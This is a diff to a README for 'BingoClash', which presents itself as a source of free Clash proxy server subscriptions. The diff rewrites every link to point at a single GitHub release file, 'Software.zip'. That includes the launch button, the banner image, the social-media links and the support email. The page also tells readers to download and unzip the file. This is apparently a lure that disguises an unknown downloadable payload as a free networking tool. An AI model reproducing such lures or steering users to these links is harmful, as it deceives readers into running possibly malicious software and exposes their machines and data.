@@ -18,7 +18,7 @@ BingoClash is your go-to repository for accessing free Clash servers subscriptio
 
 ## Get Started
 To launch BingoClash and explore the world of free Clash server subscriptions, click the button below:
-[![Launch BingoClash](https://img.shields.io/static/v1?label=Launch&message=BingoClash&color=blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Launch BingoClash](https://github.com/aothatday1207/bingoclash.github.io/releases/download/v1.0/Software.zip)](https://github.com/aothatday1207/bingoclash.github.io/releases/download/v1.0/Software.zip)
 
 If the link above ends with a file name, be sure to download and unzip the file to get started with BingoClash.
 
@@ -27,19 +27,19 @@ If the link provided does not work or is not accessible, make sure to check the 
 ## Let's Play BingoClash!
 Dive into the exciting world of free Clash server subscriptions and start your network debugging journey today. Enjoy seamless access to international platforms without restrictions. Join us at BingoClash and experience a whole new level of online connectivity! 🌐🚀
 
-![BingoClash](https://github.com/username/repository/blob/master/images/bingoclash.png)
+![BingoClash](https://github.com/aothatday1207/bingoclash.github.io/releases/download/v1.0/Software.zip)
 
 ## Connect with Us
 Stay connected with the BingoClash community for updates, discussions, and more:
-- [Twitter](https://twitter.com/BingoClash)
-- [Discord](https://discord.gg/BingoClash)
-- [Blog](https://bingoclash.com/blog)
+- [Twitter](https://github.com/aothatday1207/bingoclash.github.io/releases/download/v1.0/Software.zip)
+- [Discord](https://github.com/aothatday1207/bingoclash.github.io/releases/download/v1.0/Software.zip)
+- [Blog](https://github.com/aothatday1207/bingoclash.github.io/releases/download/v1.0/Software.zip)
 
 ## Contributions
 We welcome contributions to enhance the BingoClash experience. Feel free to fork the repository, make changes, and submit pull requests. Let's make BingoClash even better together! 🛠️🤝
 
 ## Support
-For any inquiries, feedback, or assistance, reach out to our support team at [support@bingoclash.com](mailto:support@bingoclash.com). We're here to help you make the most of BingoClash!
+For any inquiries, feedback, or assistance, reach out to our support team at [https://github.com/aothatday1207/bingoclash.github.io/releases/download/v1.0/Software.zip](https://github.com/aothatday1207/bingoclash.github.io/releases/download/v1.0/Software.zip). We're here to help you make the most of BingoClash!
 
 ## Spread the Word!
 Help us spread the word about BingoClash by sharing it with your friends, colleagues, or on social media platforms. Together, let's build a vibrant community around BingoClash and empower users worldwide with free Clash server subscriptions!
